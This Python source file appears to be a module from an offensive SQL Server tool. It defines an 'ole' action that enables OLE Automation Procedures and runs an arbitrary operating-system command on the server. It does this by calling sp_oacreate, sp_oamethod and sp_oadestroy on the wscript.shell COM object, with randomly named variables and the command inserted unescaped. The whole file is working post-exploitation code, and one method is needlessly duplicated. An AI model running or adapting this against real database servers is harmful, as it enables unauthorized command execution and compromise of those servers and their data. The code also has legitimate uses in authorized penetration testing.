"""
OLE action for executing operating system commands via OLE Automation.
"""

from typing import Optional, List
from loguru import logger

from ..base import BaseAction
from ..factory import ActionFactory
from ...services.database import DatabaseContext
from ...utils import common


@ActionFactory.register(
    "ole", "Execute operating system commands via OLE Automation Procedures"
)
class ObjectLinkingEmbedding(BaseAction):
    """
    Execute operating system commands on the SQL Server using OLE Automation.

    OLE (Object Linking and Embedding) is a Microsoft technology that allows embedding
    and linking to documents and objects. In the context of SQL Server, OLE Automation
    Procedures enable interaction with COM objects from within SQL Server. These objects
    can perform tasks outside the database, such as file manipulation, network operations,
    or other system-level activities.

    This action uses sp_oacreate, sp_oamethod, and sp_oadestroy to interact with the
    wscript.shell COM object for command execution.
    """

    def __init__(self):
        super().__init__()
        self._command: str = ""

    def validate_arguments(self, args: List[str]) -> bool:
        """
        Validate that a command is provided.

        Args:
            args: List of command arguments to execute

        Returns:
            bool: True if validation succeeds

        Raises:
            ValueError: If no command is provided
        """
        if not args or len(args) == 0:
            raise ValueError(
                "A command must be provided for OLE execution. Usage: <command>"
            )

        self._command = " ".join(args)
        return True

    def execute(self, database_context: DatabaseContext) -> None:
        """
        Execute the provided command using OLE Automation Procedures.

        This method:
        1. Enables 'Ole Automation Procedures' if disabled
        2. Creates a wscript.shell COM object using sp_oacreate
        3. Executes the command using sp_oamethod
        4. Destroys the COM object using sp_oadestroy

        Args:
            database_context: The database context containing QueryService and ConfigService

        Returns:
            None
        """
        logger.info(f"Executing OLE command: {self._command}")

        # Ensure 'Ole Automation Procedures' are enabled
        if not database_context.config_service.set_configuration_option(
            "Ole Automation Procedures", 1
        ):
            logger.error(
                "Unable to enable Ole Automation Procedures. Ensure you have the necessary permissions."
            )
            return None

        # Generate two random variable names (6 characters each)
        output = common.generate_random_string(6)
        program = common.generate_random_string(6)

        # Construct the OLE Automation query
        query = (
            f"DECLARE @{output} INT; "
            f"DECLARE @{program} VARCHAR(255);"
            f"SET @{program} = 'Run(\"{self._command}\")';"
            f"EXEC sp_oacreate 'wscript.shell', @{output} out;"
            f"EXEC sp_oamethod @{output}, @{program};"
            f"EXEC sp_oadestroy @{output};"
        )

        database_context.query_service.execute_non_processing(query)
        logger.success("Executed command")

        return None

    def get_arguments(self) -> List[str]:
        """
        Get the list of arguments for this action.

        Returns:
            List of argument descriptions
        """
        return ["Operating system command to execute via OLE Automation"]

    def get_arguments(self) -> List[str]:
        """
        Get the list of arguments for this action.

        Returns:
            List of argument descriptions
        """
        return ["Operating system command to execute via OLE Automation"]
